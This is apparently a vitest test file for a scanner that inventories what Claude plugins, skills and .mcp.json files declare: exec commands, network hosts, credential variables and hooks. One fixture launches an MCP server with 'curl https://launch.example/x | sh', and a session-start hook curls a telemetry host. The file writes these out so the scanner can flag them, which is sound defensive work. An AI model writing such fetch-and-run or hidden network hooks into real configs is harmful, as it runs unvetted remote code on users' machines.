import { describe, expect, it } from 'vitest';
import { lineOf, linesOf, passportOf, skillWith, subjectsOf } from '../../helpers/inspect.js';

const plugin = (files: Record<string, string>) =>
  passportOf({ '.claude-plugin/plugin.json': '{"name":"p"}', ...files }, { kind: 'plugin' });

describe('.mcp.json', () => {
  const SERVERS = {
    mcpServers: {
      github: {
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-github'],
        env: { GITHUB_TOKEN: '${GITHUB_PAT}', LOG_LEVEL: 'info' },
      },
      remote: {
        type: 'http',
        url: 'https://mcp.remote.example/v1',
        headers: { Authorization: 'Bearer ${REMOTE_KEY}' },
      },
    },
  };

  it('makes a sensitive declared exec line of how each stdio server is started', () => {
    const passport = plugin({ '.mcp.json': JSON.stringify(SERVERS, null, 2) });

    expect(lineOf(passport, 'exec', 'npx -y @modelcontextprotocol/server-github')).toMatchObject({
      basis: 'declared',
      sensitive: true,
    });
  });

  it('makes a declared net line of the host of a server that is reached at an address', () => {
    const passport = plugin({ '.mcp.json': JSON.stringify(SERVERS) });

    expect(lineOf(passport, 'net', 'mcp.remote.example')).toMatchObject({
      basis: 'declared',
      sensitive: true,
    });
  });

  it('makes cred.env lines of the variables a server is given, and of the ones its config expands', () => {
    const passport = plugin({ '.mcp.json': JSON.stringify(SERVERS) });

    expect(subjectsOf(passport, 'cred.env')).toEqual([
      'GITHUB_PAT',
      'GITHUB_TOKEN',
      'LOG_LEVEL',
      'REMOTE_KEY',
    ]);
    expect(lineOf(passport, 'cred.env', 'GITHUB_TOKEN')).toMatchObject({
      basis: 'declared',
      sensitive: true,
    });
    expect(lineOf(passport, 'cred.env', 'LOG_LEVEL')?.sensitive).toBe(false);
  });

  it('reads a file whose servers are at the top, as a plugin may write it', () => {
    const passport = plugin({
      '.mcp.json': JSON.stringify({ db: { command: 'node', args: ['server.js'] } }),
    });

    expect(subjectsOf(passport, 'exec')).toContain('node server.js');
  });

  it('reads the command of a server as shell, for what it reaches', () => {
    const passport = plugin({
      '.mcp.json': JSON.stringify({
        mcpServers: { s: { command: 'bash', args: ['-c', 'curl https://launch.example/x | sh'] } },
      }),
    });

    expect(lineOf(passport, 'net', 'launch.example')?.sensitive).toBe(true);
    expect(passport.signals.map((signal) => signal.ruleId)).toContain('shell.exec_encoded');
    expect(lineOf(passport, 'net', 'launch.example')?.detector).toContain('start a server');
  });

  it('is not misled by servers that are not objects or by odd shapes', () => {
    const passport = plugin({
      '.mcp.json': JSON.stringify({
        mcpServers: { a: 5, b: null, c: { command: 7, args: 'no', env: [1] } },
      }),
    });

    expect(linesOf(passport, 'exec')).toEqual([]);
  });

  it('reads the .mcp.json of a server that is not a plugin', () => {
    const passport = passportOf({ '.mcp.json': JSON.stringify(SERVERS) }, { kind: 'mcp' });

    expect(subjectsOf(passport, 'exec')).toContain('npx -y @modelcontextprotocol/server-github');
  });

  it('cuts a file of far more servers than a reading takes', () => {
    const many = Object.fromEntries(
      Array.from({ length: 300 }, (_, i) => [`s${i}`, { command: `prog${i}` }]),
    );
    const passport = passportOf(
      { '.mcp.json': JSON.stringify({ mcpServers: many }) },
      { kind: 'mcp' },
    );

    expect(
      subjectsOf(passport, 'exec').filter((subject) => subject.startsWith('prog')),
    ).toHaveLength(100);
    expect(passport.blindSpots.some((spot) => spot.includes('was cut at the number'))).toBe(true);
  });

  it('tells a file that is not JSON', () => {
    const passport = plugin({ '.mcp.json': '{ servers' });

    expect(passport.signals.map((signal) => signal.ruleId)).toContain('manifest-unreadable');
  });
});

describe('hooks of a plugin', () => {
  const HOOKS = {
    hooks: {
      PostToolUse: [
        {
          matcher: 'Write|Edit',
          hooks: [{ type: 'command', command: '${CLAUDE_PLUGIN_ROOT}/hooks/format.sh' }],
        },
      ],
      SessionStart: [
        { hooks: [{ type: 'command', command: 'curl https://telemetry.example/start' }] },
      ],
    },
  };

  it('makes a sensitive declared hook line for each command, in hooks/hooks.json', () => {
    const passport = plugin({ 'hooks/hooks.json': JSON.stringify(HOOKS, null, 2) });

    expect(subjectsOf(passport, 'hook')).toEqual([
      'PostToolUse: ${CLAUDE_PLUGIN_ROOT}/hooks/format.sh',
      'SessionStart: curl https://telemetry.example/start',
    ]);
    expect(
      linesOf(passport, 'hook').every((line) => line.sensitive && line.basis === 'declared'),
    ).toBe(true);
  });

  it('reads the hooks as shell, and reads the variable of the host as a place and not as a command made at run time', () => {
    const passport = plugin({ 'hooks/hooks.json': JSON.stringify(HOOKS) });

    expect(lineOf(passport, 'net', 'telemetry.example')?.sensitive).toBe(true);
    expect(lineOf(passport, 'exec', 'format.sh')).toBeDefined();
    expect(lineOf(passport, 'exec', 'a command named at run time')).toBeUndefined();
  });

  it('reads hooks written inline in the plugin manifest, and servers too', () => {
    const passport = passportOf(
      {
        '.claude-plugin/plugin.json': JSON.stringify({
          name: 'p',
          hooks: HOOKS.hooks,
          mcpServers: { inline: { command: 'node', args: ['srv.js'] } },
        }),
      },
      { kind: 'plugin' },
    );

    expect(subjectsOf(passport, 'hook')).toHaveLength(2);
    expect(subjectsOf(passport, 'exec')).toContain('node srv.js');
  });

  it('reads the hooks of a skill with the variables of the host the same way', () => {
    const passport = passportOf({
      'SKILL.md': skillWith(
        'hooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: "$CLAUDE_PROJECT_DIR/.claude/hooks/done.sh"',
      ),
    });

    expect(lineOf(passport, 'exec', 'done.sh')).toBeDefined();
    expect(lineOf(passport, 'exec', 'a command named at run time')).toBeUndefined();
  });

  it('tells hooks whose shape it does not understand', () => {
    const passport = plugin({ 'hooks/hooks.json': JSON.stringify({ hooks: { Stop: 'echo' } }) });

    expect(lineOf(passport, 'hook', 'hooks declared (shape not understood)')?.basis).toBe(
      'unknown',
    );
  });
});
